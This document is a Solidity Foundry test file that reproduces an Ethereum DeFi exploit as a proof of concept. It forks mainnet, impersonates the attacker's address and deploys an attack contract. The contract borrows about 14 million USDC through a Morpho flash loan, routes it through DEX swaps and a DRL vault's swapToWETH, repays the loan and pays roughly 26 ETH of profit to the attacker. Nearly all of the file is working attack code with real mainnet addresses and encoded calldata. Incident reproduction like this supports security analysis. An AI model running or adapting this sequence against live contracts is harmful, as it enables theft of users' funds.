
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 23769386;
    uint256 constant TX_TIMESTAMP = 1762784051;
    uint256 constant TX_BLOCK_NUMBER = 23769387;
    uint256 constant TX_VALUE = 367;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AttackContract attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = AttackContract(payable(ATTACK_CONTRACT));
        } else {
            attack = new AttackContract();
        }
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_4838B1_5F97, address(0), Addresses.ZERO, "ETH", 995375203980555664);
        _expectProfit(Addresses.ATTACKER_EOA, address(0), Addresses.ZERO, "ETH", 26248543012658746672);
    }
}

contract AttackContract {
    uint256 internal constant BORROWED_USDC = 13980773000000;
    uint256 internal constant DRL_SWAP_AMOUNT = 100000000000;
    uint256 internal constant ROUTER_ETH_IN = 779999999999792152553;
    uint256 internal constant POOL_WETH_REPAY = 5827696456660597362;
    uint256 internal constant STORAGE_PROFIT_ETH = 995375203980555664;
    uint256 internal constant ATTACKER_PROFIT_ETH = 26126564958977372715;

    function attack() external payable {
        _borrowFromMorpho();
        _settleProfit();
    }

    function _handleFlashLoanCall() internal {
        handledZeroCallback = true;
    }

    function flashCallback() internal {
        handledMorphoCallback = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.A_40AA95_CD7F, type(uint256).max);
    }

    function flashCallback3() internal {
        IUniswapSwapTo(Addresses.A_2E1DEE_8764)
            .uniswapV3SwapTo(
                0x39bfdcf85c2680e08d97e151473a848c3d9ca3f323cb720472d015,
                BORROWED_USDC,
                96069676420420156,
                _uintArray1(0x200000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f)
            );
    }

    function flashCallback4() internal {
        IDRLVaultV3(Addresses.DRL_VAULT_V3).swapToWETH(DRL_SWAP_AMOUNT);
    }

    function flashCallback5() internal {
        IUniswapSwapTo(Addresses.DEX_ROUTER).uniswapV3SwapTo{value: ROUTER_ETH_IN}(
            0x19afde08d97e151473a848c3d9ca3f323cb720472d015,
            ROUTER_ETH_IN,
            0,
            _uintArray1(0x800000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f)
        );
        _wrapWeth(POOL_WETH_REPAY);
    }

    function flashCallback6() internal {
        IUniswapV3Pool(Addresses.A_E0554A_939F)
            .swap(
                address(this),
                false,
                int256(-21291294106),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                _poolSwapData()
            );
    }

    function flashCallback7() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.MORPHO, BORROWED_USDC);
    }

    function _borrowFromMorpho() internal {
        IMorpho(Addresses.MORPHO).flashLoan(Addresses.USDC, BORROWED_USDC, _morphoData());
    }

    function _morphoData() internal pure returns (bytes memory) {
        return hex"0500a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000044095ea7b300000000000000000000000040aa958dd87fc8305b97f2ba922cddca374bcd7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff06000001002e1dee213ba8d7af0934c49a23187babeaca87640000c40d5f0e3b000000000039bfdcf85c2680e08d97e151473a848c3d9ca3f323cb720472d01500000000000000000000000000000000000000000000000000000cb72702234000000000000000000000000000000000000000000000000001554edc98b9d23c00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001200000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f05006a06707ab339bee00c6663db17ddb422301ff5e8000024e747d9dc000000000000000000000000000000000000000000000000000000174876e8000501f6801d319497789f934ec7f83e142a9536312b080000002a48acab61f84c7fe90000c40d5f0e3b000000000000000000019afde08d97e151473a848c3d9ca3f323cb720472d01500000000000000000000000000000000000000000000002a48acab61f84c7fe9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001800000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f0501c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000050e0230d060eba720000000200008100e0554a476a092703abdb3ef35c80e0d76d32939f000124128acb08000000000000000000000000e08d97e151473a848c3d9ca3f323cb720472d0150000000000000000000000000000000000000000000000000000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffb0af0a266000000000000000000000000fffd8963efd1fc6a506488495d951d5263988d2500000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000005e0500c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000044a9059cbb000000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f00000000000000000000000000000000000000000000000050e0230d060eba720500000500a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000044095ea7b3000000000000000000000000bbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb00000000000000000000000000000000000000000000000000000cb72702234005";
    }

    function _poolSwapData() internal pure returns (bytes memory) {
        return hex"0500c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000044a9059cbb000000000000000000000000e0554a476a092703abdb3ef35c80e0d76d32939f00000000000000000000000000000000000000000000000050e0230d060eba7205";
    }

    function _settleProfit() internal {
        _sendProfitEth(Addresses.A_4838B1_5F97, STORAGE_PROFIT_ETH);
        _sendProfitEth(Addresses.ATTACKER_EOA, ATTACKER_PROFIT_ETH);
    }

    function _swapCb() internal {
        handledSwapCallback = true;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_E0554A_939F, POOL_WETH_REPAY);
    }

    function _sendProfitEth(address recipient, uint256 maxAmount) internal {
        uint256 profitAmount = address(this).balance;
        if (profitAmount > maxAmount) profitAmount = maxAmount;
        (bool ok,) = payable(recipient).call{value: profitAmount}("");
        ok;
    }

    function _wrapWeth(uint256 amount) internal {
        (bool ok,) = payable(Addresses.WETH).call{value: amount}("");
        ok;
    }

    receive() external payable {}

    function onMorphoFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        if (!handledMorphoCallback) flashCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function NotYoink() external payable {
        _borrowFromMorpho();
        _settleProfit();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external payable {
        amount0Delta;
        amount1Delta;
        data;
        if (!handledSwapCallback) _swapCb();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x00000000) {
            if (!handledZeroCallback) _handleFlashLoanCall();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
    }

    bool private handledZeroCallback;
    bool private handledMorphoCallback;
    bool private handledSwapCallback;

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_2E1DEE_8764 = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
    address internal constant A_40AA95_CD7F = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    address internal constant A_4838B1_5F97 = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
    address internal constant DRL_VAULT_V3 = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant ATTACKER_EOA = 0xC0ffeEBABE5D496B2DDE509f9fa189C25cF29671;
    address internal constant A_E0554A_939F = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address internal constant ATTACK_CONTRACT = 0xE08D97e151473A848C3d9CA3f323Cb720472D015;
    address internal constant DEX_ROUTER = 0xF6801D319497789f934ec7F83E142a9536312B08;
}

interface IUniswapV3Pool {
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IDRLVaultV3 {
    function swapToWETH(uint256) external returns (uint256);
}

interface IUniswapSwapTo {
    function uniswapV3SwapTo(uint256, uint256, uint256, uint256[] calldata) external payable returns (uint256);
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}
